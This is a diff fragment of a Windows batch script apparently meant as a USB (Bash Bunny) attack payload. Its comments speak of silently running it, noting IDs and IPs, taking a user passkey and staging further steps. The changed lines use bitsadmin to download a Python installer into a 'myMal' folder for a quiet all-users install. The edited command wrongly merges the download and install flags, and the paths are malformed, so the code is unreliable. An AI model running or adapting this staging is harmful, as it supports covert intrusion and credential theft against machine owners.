@@ -20,8 +20,7 @@ REM What does it do next--jot ids and ips. get xp--user passkey.
 
 REM silently run this but first modify it. notice the source and destination, is that right?
 @echo off
-bitsadmin.exe /transfer myDownloadJob https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe "C:Users\bwebb\myMal\python-installer.exe"
-"C:Users\bwebb\myMal\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
-del /f /q "C:Users\bwebb\python-installer.exe"
+bitsadmin.exe /transfer myDownloadJob https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe "C:Users\bwebb\myMal\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1
+
 
 REM don't forget to run this off the bash bunny and don't forget stage one and two--aomei and kaley.
